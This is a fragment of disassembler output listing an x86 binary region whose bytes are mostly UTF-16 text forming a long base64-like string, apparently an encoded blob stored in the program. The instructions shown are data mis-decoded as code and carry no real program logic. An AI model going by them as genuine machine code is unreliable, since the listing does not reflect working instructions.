  402b5b:	77 00                	ja     0x402b5d
  402b5d:	55                   	push   %ebp
  402b5e:	00 46 00             	add    %al,0x0(%esi)
  402b61:	68 00 48 00 56       	push   $0x56004800
  402b66:	00 57 00             	add    %dl,0x0(%edi)
  402b69:	4e                   	dec    %esi
  402b6a:	00 34 00             	add    %dh,(%eax,%eax,1)
  402b6d:	67 00 32             	add    %dh,(%bp,%si)
  402b70:	00 30                	add    %dh,(%eax)
  402b72:	00 72 00             	add    %dh,0x0(%edx)
  402b75:	6b 00 31             	imul   $0x31,(%eax),%eax
  402b78:	00 32                	add    %dh,(%edx)
  402b7a:	00 51 00             	add    %dl,0x0(%ecx)
  402b7d:	52                   	push   %edx
  402b7e:	00 70 00             	add    %dh,0x0(%eax)
  402b81:	63 00                	arpl   %eax,(%eax)
  402b83:	32 00                	xor    (%eax),%al
  402b85:	55                   	push   %ebp
  402b86:	00 5a 00             	add    %bl,0x0(%edx)
  402b89:	56                   	push   %esi
  402b8a:	00 69 00             	add    %ch,0x0(%ecx)
  402b8d:	75 00                	jne    0x402b8f
  402b8f:	37                   	aaa
  402b90:	00 79 00             	add    %bh,0x0(%ecx)
  402b93:	4c                   	dec    %esp
  402b94:	00 32                	add    %dh,(%edx)
  402b96:	00 6d 00             	add    %ch,0x0(%ebp)
  402b99:	42                   	inc    %edx
  402b9a:	00 50 00             	add    %dl,0x0(%eax)
  402b9d:	74 00                	je     0x402b9f
  402b9f:	5a                   	pop    %edx
  402ba0:	00 35 00 59 00 30    	add    %dh,0x30005900
  402ba6:	00 42 00             	add    %al,0x0(%edx)
  402ba9:	48                   	dec    %eax
  402baa:	00 6e 00             	add    %ch,0x0(%esi)
  402bad:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  402bb1:	75 00                	jne    0x402bb3
  402bb3:	59                   	pop    %ecx
  402bb4:	00 43 00             	add    %al,0x0(%ebx)
  402bb7:	6d                   	insl   (%dx),%es:(%edi)
  402bb8:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  402bbc:	00 36                	add    %dh,(%esi)
  402bbe:	00 2b                	add    %ch,(%ebx)
  402bc0:	00 66 00             	add    %ah,0x0(%esi)
  402bc3:	38 00                	cmp    %al,(%eax)
  402bc5:	69 00 56 00 50 00    	imul   $0x500056,(%eax),%eax
  402bcb:	77 00                	ja     0x402bcd
  402bcd:	6b 00 63             	imul   $0x63,(%eax),%eax
  402bd0:	00 7a 00             	add    %bh,0x0(%edx)
  402bd3:	53                   	push   %ebx
  402bd4:	00 53 00             	add    %dl,0x0(%ebx)
  402bd7:	30 00                	xor    %al,(%eax)
  402bd9:	5a                   	pop    %edx
  402bda:	00 62 00             	add    %ah,0x0(%edx)
  402bdd:	77 00                	ja     0x402bdf
  402bdf:	43                   	inc    %ebx
  402be0:	00 6d 00             	add    %ch,0x0(%ebp)
  402be3:	77 00                	ja     0x402be5
  402be5:	44                   	inc    %esp
  402be6:	00 38                	add    %bh,(%eax)
  402be8:	00 6a 00             	add    %ch,0x0(%edx)
  402beb:	34 00                	xor    $0x0,%al
  402bed:	44                   	inc    %esp
  402bee:	00 78 00             	add    %bh,0x0(%eax)
  402bf1:	2b 00                	sub    (%eax),%eax
  402bf3:	45                   	inc    %ebp
  402bf4:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  402bf8:	00 72 00             	add    %dh,0x0(%edx)
  402bfb:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  402bff:	61                   	popa
  402c00:	00 46 00             	add    %al,0x0(%esi)
  402c03:	32 00                	xor    (%eax),%al
  402c05:	6e                   	outsb  %ds:(%esi),(%dx)
  402c06:	00 39                	add    %bh,(%ecx)
  402c08:	00 4f 00             	add    %cl,0x0(%edi)
  402c0b:	54                   	push   %esp
  402c0c:	00 48 00             	add    %cl,0x0(%eax)
  402c0f:	7a 00                	jp     0x402c11
  402c11:	50                   	push   %eax
  402c12:	00 4a 00             	add    %cl,0x0(%edx)
  402c15:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  402c19:	79 00                	jns    0x402c1b
  402c1b:	56                   	push   %esi
  402c1c:	00 73 00             	add    %dh,0x0(%ebx)
  402c1f:	33 00                	xor    (%eax),%eax
  402c21:	47                   	inc    %edi
  402c22:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  402c26:	00 46 00             	add    %al,0x0(%esi)
  402c29:	4b                   	dec    %ebx
  402c2a:	00 46 00             	add    %al,0x0(%esi)
  402c2d:	5a                   	pop    %edx
  402c2e:	00 57 00             	add    %dl,0x0(%edi)
  402c31:	4b                   	dec    %ebx
  402c32:	00 48 00             	add    %cl,0x0(%eax)
  402c35:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  402c39:	51                   	push   %ecx
  402c3a:	00 46 00             	add    %al,0x0(%esi)
  402c3d:	70 00                	jo     0x402c3f
  402c3f:	4c                   	dec    %esp
  402c40:	00 75 00             	add    %dh,0x0(%ebp)
  402c43:	62 00                	bound  %eax,(%eax)
  402c45:	70 00                	jo     0x402c47
  402c47:	32 00                	xor    (%eax),%al
  402c49:	47                   	inc    %edi
  402c4a:	00 50 00             	add    %dl,0x0(%eax)
  402c4d:	6b 00 42             	imul   $0x42,(%eax),%eax
  402c50:	00 6e 00             	add    %ch,0x0(%esi)
  402c53:	69 00 79 00 43 00    	imul   $0x430079,(%eax),%eax
  402c59:	62 00                	bound  %eax,(%eax)
  402c5b:	78 00                	js     0x402c5d
  402c5d:	4b                   	dec    %ebx
  402c5e:	00 78 00             	add    %bh,0x0(%eax)
  402c61:	51                   	push   %ecx
  402c62:	00 78 00             	add    %bh,0x0(%eax)
  402c65:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  402c69:	41                   	inc    %ecx
  402c6a:	00 71 00             	add    %dh,0x0(%ecx)
  402c6d:	75 00                	jne    0x402c6f
  402c6f:	66 00 56 00          	data16 add %dl,0x0(%esi)
  402c73:	70 00                	jo     0x402c75
  402c75:	55                   	push   %ebp
  402c76:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  402c7a:	00 45 00             	add    %al,0x0(%ebp)
  402c7d:	4e                   	dec    %esi
  402c7e:	00 66 00             	add    %ah,0x0(%esi)
  402c81:	34 00                	xor    $0x0,%al
  402c83:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  402c87:	31 00                	xor    %eax,(%eax)
  402c89:	39 00                	cmp    %eax,(%eax)
  402c8b:	2b 00                	sub    (%eax),%eax
  402c8d:	78 00                	js     0x402c8f
  402c8f:	6c                   	insb   (%dx),%es:(%edi)
  402c90:	00 79 00             	add    %bh,0x0(%ecx)
  402c93:	6f                   	outsl  %ds:(%esi),(%dx)
  402c94:	00 4b 00             	add    %cl,0x0(%ebx)
  402c97:	58                   	pop    %eax
  402c98:	00 62 00             	add    %ah,0x0(%edx)
  402c9b:	2f                   	das
  402c9c:	00 6b 00             	add    %ch,0x0(%ebx)
  402c9f:	76 00                	jbe    0x402ca1
  402ca1:	4f                   	dec    %edi
  402ca2:	00 73 00             	add    %dh,0x0(%ebx)
  402ca5:	48                   	dec    %eax
  402ca6:	00 6a 00             	add    %ch,0x0(%edx)
  402ca9:	36 00 74 00 79       	add    %dh,%ss:0x79(%eax,%eax,1)
  402cae:	00 6e 00             	add    %ch,0x0(%esi)
  402cb1:	6b 00 39             	imul   $0x39,(%eax),%eax
  402cb4:	00 37                	add    %dh,(%edi)
  402cb6:	00 46 00             	add    %al,0x0(%esi)
  402cb9:	44                   	inc    %esp
  402cba:	00 62 00             	add    %ah,0x0(%edx)
  402cbd:	55                   	push   %ebp
  402cbe:	00 4b 00             	add    %cl,0x0(%ebx)
  402cc1:	35 00 35 00 4d       	xor    $0x4d003500,%eax
  402cc6:	00 6b 00             	add    %ch,0x0(%ebx)
  402cc9:	37                   	aaa
  402cca:	00 68 00             	add    %ch,0x0(%eax)
  402ccd:	34 00                	xor    $0x0,%al
  402ccf:	79 00                	jns    0x402cd1
  402cd1:	7a 00                	jp     0x402cd3
  402cd3:	34 00                	xor    $0x0,%al
  402cd5:	30 00                	xor    %al,(%eax)
  402cd7:	54                   	push   %esp
  402cd8:	00 4b 00             	add    %cl,0x0(%ebx)
  402cdb:	68 00 4b 00 2b       	push   $0x2b004b00
  402ce0:	00 63 00             	add    %ah,0x0(%ebx)
  402ce3:	76 00                	jbe    0x402ce5
  402ce5:	4c                   	dec    %esp
  402ce6:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  402cea:	00 4d 00             	add    %cl,0x0(%ebp)
  402ced:	5a                   	pop    %edx
  402cee:	00 72 00             	add    %dh,0x0(%edx)
  402cf1:	33 00                	xor    (%eax),%eax
  402cf3:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  402cf7:	52                   	push   %edx
  402cf8:	00 6b 00             	add    %ch,0x0(%ebx)
  402cfb:	5a                   	pop    %edx
  402cfc:	00 50 00             	add    %dl,0x0(%eax)
  402cff:	68 00 65 00 53       	push   $0x53006500
  402d04:	00 72 00             	add    %dh,0x0(%edx)
  402d07:	57                   	push   %edi
  402d08:	00 61 00             	add    %ah,0x0(%ecx)
  402d0b:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  402d0f:	43                   	inc    %ebx
  402d10:	00 65 00             	add    %ah,0x0(%ebp)
  402d13:	44                   	inc    %esp
  402d14:	00 7a 00             	add    %bh,0x0(%edx)
  402d17:	4a                   	dec    %edx
  402d18:	00 6f 00             	add    %ch,0x0(%edi)
  402d1b:	6a 00                	push   $0x0
  402d1d:	6c                   	insb   (%dx),%es:(%edi)
  402d1e:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  402d22:	00 42 00             	add    %al,0x0(%edx)
  402d25:	6c                   	insb   (%dx),%es:(%edi)
  402d26:	00 2f                	add    %ch,(%edi)
  402d28:	00 48 00             	add    %cl,0x0(%eax)
  402d2b:	7a 00                	jp     0x402d2d
  402d2d:	73 00                	jae    0x402d2f
  402d2f:	69 00 33 00 59 00    	imul   $0x590033,(%eax),%eax
  402d35:	4c                   	dec    %esp
  402d36:	00 2f                	add    %ch,(%edi)
  402d38:	00 4e 00             	add    %cl,0x0(%esi)
  402d3b:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  402d3f:	75 00                	jne    0x402d41
  402d41:	2f                   	das
  402d42:	00 34 00             	add    %dh,(%eax,%eax,1)
  402d45:	4f                   	dec    %edi
  402d46:	00 73 00             	add    %dh,0x0(%ebx)
  402d49:	6c                   	insb   (%dx),%es:(%edi)
  402d4a:	00 45 00             	add    %al,0x0(%ebp)
  402d4d:	6c                   	insb   (%dx),%es:(%edi)
  402d4e:	00 57 00             	add    %dl,0x0(%edi)
  402d51:	79 00                	jns    0x402d53
  402d53:	44                   	inc    %esp
  402d54:	00 5a 00             	add    %bl,0x0(%edx)
  402d57:	44                   	inc    %esp
  402d58:	00 62 00             	add    %ah,0x0(%edx)
  402d5b:	2f                   	das
  402d5c:	00 35 00 66 00 6c    	add    %dh,0x6c006600
  402d62:	00 52 00             	add    %dl,0x0(%edx)
  402d65:	7a 00                	jp     0x402d67
  402d67:	5a                   	pop    %edx
  402d68:	00 66 00             	add    %ah,0x0(%esi)
  402d6b:	30 00                	xor    %al,(%eax)
  402d6d:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  402d71:	68 00 66 00 69       	push   $0x69006600
  402d76:	00 58 00             	add    %bl,0x0(%eax)
  402d79:	71 00                	jno    0x402d7b
  402d7b:	56                   	push   %esi
  402d7c:	00 78 00             	add    %bh,0x0(%eax)
  402d7f:	59                   	pop    %ecx
  402d80:	00 48 00             	add    %cl,0x0(%eax)
  402d83:	49                   	dec    %ecx
  402d84:	00 78 00             	add    %bh,0x0(%eax)
  402d87:	68 00 4c 00 72       	push   $0x72004c00
  402d8c:	00 6d 00             	add    %ch,0x0(%ebp)
  402d8f:	38 00                	cmp    %al,(%eax)
  402d91:	6c                   	insb   (%dx),%es:(%edi)
  402d92:	00 73 00             	add    %dh,0x0(%ebx)
  402d95:	43                   	inc    %ebx
  402d96:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  402d9a:	00 2b                	add    %ch,(%ebx)
  402d9c:	00 39                	add    %bh,(%ecx)
  402d9e:	00 6b 00             	add    %ch,0x0(%ebx)
  402da1:	76 00                	jbe    0x402da3
  402da3:	45                   	inc    %ebp
  402da4:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  402da8:	00 78 00             	add    %bh,0x0(%eax)
  402dab:	35 00 65 00 55       	xor    $0x55006500,%eax
  402db0:	00 43 00             	add    %al,0x0(%ebx)
  402db3:	31 00                	xor    %eax,(%eax)
  402db5:	4a                   	dec    %edx
  402db6:	00 55 00             	add    %dl,0x0(%ebp)
  402db9:	4c                   	dec    %esp
  402dba:	00 49 00             	add    %cl,0x0(%ecx)
  402dbd:	43                   	inc    %ebx
  402dbe:	00 7a 00             	add    %bh,0x0(%edx)
  402dc1:	73 00                	jae    0x402dc3
  402dc3:	34 00                	xor    $0x0,%al
  402dc5:	76 00                	jbe    0x402dc7
  402dc7:	4e                   	dec    %esi
  402dc8:	00 4a 00             	add    %cl,0x0(%edx)
  402dcb:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  402dcf:	32 00                	xor    (%eax),%al
  402dd1:	72 00                	jb     0x402dd3
  402dd3:	79 00                	jns    0x402dd5
  402dd5:	55                   	push   %ebp
  402dd6:	00 78 00             	add    %bh,0x0(%eax)
  402dd9:	6d                   	insl   (%dx),%es:(%edi)
  402dda:	00 73 00             	add    %dh,0x0(%ebx)
  402ddd:	53                   	push   %ebx
  402dde:	00 59 00             	add    %bl,0x0(%ecx)
  402de1:	59                   	pop    %ecx
  402de2:	00 73 00             	add    %dh,0x0(%ebx)
  402de5:	79 00                	jns    0x402de7
  402de7:	31 00                	xor    %eax,(%eax)
  402de9:	51                   	push   %ecx
  402dea:	00 39                	add    %bh,(%ecx)
  402dec:	00 49 00             	add    %cl,0x0(%ecx)
  402def:	4f                   	dec    %edi
  402df0:	00 62 00             	add    %ah,0x0(%edx)
  402df3:	42                   	inc    %edx
  402df4:	00 73 00             	add    %dh,0x0(%ebx)
  402df7:	59                   	pop    %ecx
  402df8:	00 45 00             	add    %al,0x0(%ebp)
  402dfb:	46                   	inc    %esi
  402dfc:	00 67 00             	add    %ah,0x0(%edi)
  402dff:	30 00                	xor    %al,(%eax)
  402e01:	48                   	dec    %eax
  402e02:	00 38                	add    %bh,(%eax)
  402e04:	00 79 00             	add    %bh,0x0(%ecx)
  402e07:	6a 00                	push   $0x0
  402e09:	58                   	pop    %eax
  402e0a:	00 78 00             	add    %bh,0x0(%eax)
  402e0d:	52                   	push   %edx
  402e0e:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  402e12:	00 76 00             	add    %dh,0x0(%esi)
  402e15:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  402e19:	52                   	push   %edx
  402e1a:	00 49 00             	add    %cl,0x0(%ecx)
  402e1d:	45                   	inc    %ebp
  402e1e:	00 31                	add    %dh,(%ecx)
  402e20:	00 69 00             	add    %ch,0x0(%ecx)
  402e23:	42                   	inc    %edx
  402e24:	00 6f 00             	add    %ch,0x0(%edi)
  402e27:	43                   	inc    %ebx
  402e28:	00 46 00             	add    %al,0x0(%esi)
  402e2b:	61                   	popa
  402e2c:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  402e30:	00 6e 00             	add    %ch,0x0(%esi)
  402e33:	55                   	push   %ebp
  402e34:	00 45 00             	add    %al,0x0(%ebp)
  402e37:	7a 00                	jp     0x402e39
  402e39:	35 00 51 00 56       	xor    $0x56005100,%eax
  402e3e:	00 38                	add    %bh,(%eax)
  402e40:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  402e44:	00 39                	add    %bh,(%ecx)
  402e46:	00 61 00             	add    %ah,0x0(%ecx)
  402e49:	6a 00                	push   $0x0
  402e4b:	31 00                	xor    %eax,(%eax)
  402e4d:	75 00                	jne    0x402e4f
  402e4f:	49                   	dec    %ecx
  402e50:	00 45 00             	add    %al,0x0(%ebp)
  402e53:	4a                   	dec    %edx
  402e54:	00 35 00 71 00 54    	add    %dh,0x54007100
  402e5a:	00 57 00             	add    %dl,0x0(%edi)
  402e5d:	5a                   	pop    %edx
  402e5e:	00 46 00             	add    %al,0x0(%esi)
  402e61:	4e                   	dec    %esi
  402e62:	00 67 00             	add    %ah,0x0(%edi)
  402e65:	49                   	dec    %ecx
  402e66:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  402e6a:	00 6d 00             	add    %ch,0x0(%ebp)
  402e6d:	39 00                	cmp    %eax,(%eax)
  402e6f:	53                   	push   %ebx
  402e70:	00 67 00             	add    %ah,0x0(%edi)
  402e73:	4a                   	dec    %edx
  402e74:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  402e78:	00 72 00             	add    %dh,0x0(%edx)
  402e7b:	6e                   	outsb  %ds:(%esi),(%dx)
  402e7c:	00 49 00             	add    %cl,0x0(%ecx)
  402e7f:	69 00 4e 00 72 00    	imul   $0x72004e,(%eax),%eax
  402e85:	52                   	push   %edx
  402e86:	00 68 00             	add    %ch,0x0(%eax)
  402e89:	2f                   	das
  402e8a:	00 61 00             	add    %ah,0x0(%ecx)
  402e8d:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  402e91:	43                   	inc    %ebx
  402e92:	00 66 00             	add    %ah,0x0(%esi)
  402e95:	45                   	inc    %ebp
  402e96:	00 34 00             	add    %dh,(%eax,%eax,1)
  402e99:	2f                   	das
  402e9a:	00 2f                	add    %ch,(%edi)
  402e9c:	00 62 00             	add    %ah,0x0(%edx)
  402e9f:	2f                   	das
  402ea0:	00 43 00             	add    %al,0x0(%ebx)
  402ea3:	57                   	push   %edi
  402ea4:	00 68 00             	add    %ch,0x0(%eax)
  402ea7:	59                   	pop    %ecx
  402ea8:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  402eac:	00 51 00             	add    %dl,0x0(%ecx)
  402eaf:	44                   	inc    %esp
  402eb0:	00 4d 00             	add    %cl,0x0(%ebp)
  402eb3:	4b                   	dec    %ebx
  402eb4:	00 35 00 44 00 7a    	add    %dh,0x7a004400
  402eba:	00 46 00             	add    %al,0x0(%esi)
  402ebd:	2f                   	das
  402ebe:	00 35 00 44 00 76    	add    %dh,0x76004400
  402ec4:	00 5a 00             	add    %bl,0x0(%edx)
  402ec7:	39 00                	cmp    %eax,(%eax)
  402ec9:	47                   	inc    %edi
  402eca:	00 38                	add    %bh,(%eax)
  402ecc:	00 67 00             	add    %ah,0x0(%edi)
  402ecf:	57                   	push   %edi
  402ed0:	00 52 00             	add    %dl,0x0(%edx)
  402ed3:	36 00 6c 00 61       	add    %ch,%ss:0x61(%eax,%eax,1)
  402ed8:	00 4e 00             	add    %cl,0x0(%esi)
  402edb:	53                   	push   %ebx
  402edc:	00 50 00             	add    %dl,0x0(%eax)
  402edf:	39 00                	cmp    %eax,(%eax)
  402ee1:	44                   	inc    %esp
  402ee2:	00 51 00             	add    %dl,0x0(%ecx)
  402ee5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ee6:	00 2b                	add    %ch,(%ebx)
  402ee8:	00 62 00             	add    %ah,0x0(%edx)
  402eeb:	59                   	pop    %ecx
  402eec:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  402ef0:	00 4e 00             	add    %cl,0x0(%esi)
  402ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef4:	00 4a 00             	add    %cl,0x0(%edx)
  402ef7:	49                   	dec    %ecx
  402ef8:	00 31                	add    %dh,(%ecx)
  402efa:	00 30                	add    %dh,(%eax)
  402efc:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  402f00:	00 73 00             	add    %dh,0x0(%ebx)
  402f03:	62 00                	bound  %eax,(%eax)
  402f05:	52                   	push   %edx
  402f06:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  402f0a:	00 65 00             	add    %ah,0x0(%ebp)
  402f0d:	33 00                	xor    (%eax),%eax
  402f0f:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  402f13:	74 00                	je     0x402f15
  402f15:	59                   	pop    %ecx
  402f16:	00 51 00             	add    %dl,0x0(%ecx)
  402f19:	6f                   	outsl  %ds:(%esi),(%dx)
  402f1a:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  402f1e:	00 7a 00             	add    %bh,0x0(%edx)
  402f21:	2f                   	das
  402f22:	00 69 00             	add    %ch,0x0(%ecx)
  402f25:	4f                   	dec    %edi
  402f26:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  402f2a:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  402f2e:	00 36                	add    %dh,(%esi)
  402f30:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  402f34:	00 42 00             	add    %al,0x0(%edx)
  402f37:	38 00                	cmp    %al,(%eax)
  402f39:	34 00                	xor    $0x0,%al
  402f3b:	37                   	aaa
  402f3c:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  402f40:	00 78 00             	add    %bh,0x0(%eax)
  402f43:	45                   	inc    %ebp
  402f44:	00 45 00             	add    %al,0x0(%ebp)
  402f47:	34 00                	xor    $0x0,%al
  402f49:	48                   	dec    %eax
  402f4a:	00 4b 00             	add    %cl,0x0(%ebx)
  402f4d:	49                   	dec    %ecx
  402f4e:	00 77 00             	add    %dh,0x0(%edi)
  402f51:	47                   	inc    %edi
  402f52:	00 55 00             	add    %dl,0x0(%ebp)
  402f55:	72 00                	jb     0x402f57
  402f57:	46                   	inc    %esi
  402f58:	00 4f 00             	add    %cl,0x0(%edi)
  402f5b:	75 00                	jne    0x402f5d
  402f5d:	44                   	inc    %esp
  402f5e:	00 52 00             	add    %dl,0x0(%edx)
  402f61:	4d                   	dec    %ebp
  402f62:	00 61 00             	add    %ah,0x0(%ecx)
  402f65:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  402f69:	4a                   	dec    %edx
  402f6a:	00 35 00 78 00 55    	add    %dh,0x55007800
  402f70:	00 65 00             	add    %ah,0x0(%ebp)
  402f73:	79 00                	jns    0x402f75
  402f75:	2b 00                	sub    (%eax),%eax
  402f77:	2f                   	das
  402f78:	00 33                	add    %dh,(%ebx)
  402f7a:	00 55 00             	add    %dl,0x0(%ebp)
  402f7d:	4c                   	dec    %esp
  402f7e:	00 61 00             	add    %ah,0x0(%ecx)
  402f81:	4a                   	dec    %edx
  402f82:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  402f86:	00 67 00             	add    %ah,0x0(%edi)
  402f89:	39 00                	cmp    %eax,(%eax)
  402f8b:	58                   	pop    %eax
  402f8c:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  402f90:	00 4d 00             	add    %cl,0x0(%ebp)
  402f93:	35 00 73 00 69       	xor    $0x69007300,%eax
  402f98:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  402f9c:	00 39                	add    %bh,(%ecx)
  402f9e:	00 4d 00             	add    %cl,0x0(%ebp)
  402fa1:	48                   	dec    %eax
  402fa2:	00 4d 00             	add    %cl,0x0(%ebp)
  402fa5:	58                   	pop    %eax
  402fa6:	00 62 00             	add    %ah,0x0(%edx)
  402fa9:	6c                   	insb   (%dx),%es:(%edi)
  402faa:	00 4e 00             	add    %cl,0x0(%esi)
  402fad:	55                   	push   %ebp
  402fae:	00 2f                	add    %ch,(%edi)
  402fb0:	00 7a 00             	add    %bh,0x0(%edx)
  402fb3:	70 00                	jo     0x402fb5
  402fb5:	4e                   	dec    %esi
  402fb6:	00 33                	add    %dh,(%ebx)
  402fb8:	00 30                	add    %dh,(%eax)
  402fba:	00 4b 00             	add    %cl,0x0(%ebx)
  402fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbe:	00 45 00             	add    %al,0x0(%ebp)
  402fc1:	4f                   	dec    %edi
  402fc2:	00 4e 00             	add    %cl,0x0(%esi)
  402fc5:	47                   	inc    %edi
  402fc6:	00 56 00             	add    %dl,0x0(%esi)
  402fc9:	74 00                	je     0x402fcb
  402fcb:	48                   	dec    %eax
  402fcc:	00 37                	add    %dh,(%edi)
  402fce:	00 57 00             	add    %dl,0x0(%edi)
  402fd1:	63 00                	arpl   %eax,(%eax)
  402fd3:	52                   	push   %edx
  402fd4:	00 4a 00             	add    %cl,0x0(%edx)
  402fd7:	70 00                	jo     0x402fd9
  402fd9:	49                   	dec    %ecx
  402fda:	00 69 00             	add    %ch,0x0(%ecx)
  402fdd:	74 00                	je     0x402fdf
  402fdf:	78 00                	js     0x402fe1
  402fe1:	54                   	push   %esp
  402fe2:	00 70 00             	add    %dh,0x0(%eax)
  402fe5:	33 00                	xor    (%eax),%eax
  402fe7:	76 00                	jbe    0x402fe9
  402fe9:	44                   	inc    %esp
  402fea:	00 62 00             	add    %ah,0x0(%edx)
  402fed:	4a                   	dec    %edx
  402fee:	00 71 00             	add    %dh,0x0(%ecx)
  402ff1:	71 00                	jno    0x402ff3
  402ff3:	48                   	dec    %eax
  402ff4:	00 46 00             	add    %al,0x0(%esi)
  402ff7:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  402ffd:	51                   	push   %ecx
  402ffe:	00 66 00             	add    %ah,0x0(%esi)
  403001:	31 00                	xor    %eax,(%eax)
  403003:	72 00                	jb     0x403005
  403005:	57                   	push   %edi
  403006:	00 69 00             	add    %ch,0x0(%ecx)
  403009:	61                   	popa
  40300a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40300d:	62 00                	bound  %eax,(%eax)
  40300f:	39 00                	cmp    %eax,(%eax)
  403011:	74 00                	je     0x403013
  403013:	32 00                	xor    (%eax),%al
  403015:	48                   	dec    %eax
  403016:	00 4d 00             	add    %cl,0x0(%ebp)
  403019:	4e                   	dec    %esi
  40301a:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40301e:	00 62 00             	add    %ah,0x0(%edx)
  403021:	68 00 4f 00 62       	push   $0x62004f00
  403026:	00 30                	add    %dh,(%eax)
  403028:	00 6d 00             	add    %ch,0x0(%ebp)
  40302b:	4f                   	dec    %edi
  40302c:	00 69 00             	add    %ch,0x0(%ecx)
  40302f:	50                   	push   %eax
  403030:	00 4b 00             	add    %cl,0x0(%ebx)
  403033:	78 00                	js     0x403035
  403035:	49                   	dec    %ecx
  403036:	00 34 00             	add    %dh,(%eax,%eax,1)
  403039:	7a 00                	jp     0x40303b
  40303b:	6c                   	insb   (%dx),%es:(%edi)
  40303c:	00 6d 00             	add    %ch,0x0(%ebp)
  40303f:	50                   	push   %eax
  403040:	00 63 00             	add    %ah,0x0(%ebx)
  403043:	2b 00                	sub    (%eax),%eax
  403045:	53                   	push   %ebx
  403046:	00 4f 00             	add    %cl,0x0(%edi)
  403049:	37                   	aaa
  40304a:	00 4f 00             	add    %cl,0x0(%edi)
  40304d:	32 00                	xor    (%eax),%al
  40304f:	39 00                	cmp    %eax,(%eax)
  403051:	32 00                	xor    (%eax),%al
  403053:	53                   	push   %ebx
  403054:	00 62 00             	add    %ah,0x0(%edx)
  403057:	74 00                	je     0x403059
  403059:	50                   	push   %eax
  40305a:	00 2f                	add    %ch,(%edi)
  40305c:	00 78 00             	add    %bh,0x0(%eax)
  40305f:	52                   	push   %edx
  403060:	00 6b 00             	add    %ch,0x0(%ebx)
  403063:	57                   	push   %edi
  403064:	00 45 00             	add    %al,0x0(%ebp)
  403067:	45                   	inc    %ebp
  403068:	00 6b 00             	add    %ch,0x0(%ebx)
  40306b:	70 00                	jo     0x40306d
  40306d:	6e                   	outsb  %ds:(%esi),(%dx)
  40306e:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  403072:	00 75 00             	add    %dh,0x0(%ebp)
  403075:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  403079:	6f                   	outsl  %ds:(%esi),(%dx)
  40307a:	00 56 00             	add    %dl,0x0(%esi)
  40307d:	4a                   	dec    %edx
  40307e:	00 7a 00             	add    %bh,0x0(%edx)
  403081:	6b 00 47             	imul   $0x47,(%eax),%eax
  403084:	00 4a 00             	add    %cl,0x0(%edx)
  403087:	68 00 7a 00 51       	push   $0x51007a00
  40308c:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  403090:	00 6e 00             	add    %ch,0x0(%esi)
  403093:	4e                   	dec    %esi
  403094:	00 6d 00             	add    %ch,0x0(%ebp)
  403097:	48                   	dec    %eax
  403098:	00 6e 00             	add    %ch,0x0(%esi)
  40309b:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40309f:	75 00                	jne    0x4030a1
  4030a1:	38 00                	cmp    %al,(%eax)
  4030a3:	44                   	inc    %esp
  4030a4:	00 4f 00             	add    %cl,0x0(%edi)
  4030a7:	48                   	dec    %eax
  4030a8:	00 2f                	add    %ch,(%edi)
  4030aa:	00 58 00             	add    %bl,0x0(%eax)
  4030ad:	44                   	inc    %esp
  4030ae:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  4030b2:	00 50 00             	add    %dl,0x0(%eax)
  4030b5:	47                   	inc    %edi
  4030b6:	00 6a 00             	add    %ch,0x0(%edx)
  4030b9:	7a 00                	jp     0x4030bb
  4030bb:	50                   	push   %eax
  4030bc:	00 66 00             	add    %ah,0x0(%esi)
  4030bf:	50                   	push   %eax
  4030c0:	00 62 00             	add    %ah,0x0(%edx)
  4030c3:	6c                   	insb   (%dx),%es:(%edi)
  4030c4:	00 4a 00             	add    %cl,0x0(%edx)
  4030c7:	65 00 35 00 37 00 51 	add    %dh,%gs:0x51003700
  4030ce:	00 49 00             	add    %cl,0x0(%ecx)
  4030d1:	50                   	push   %eax
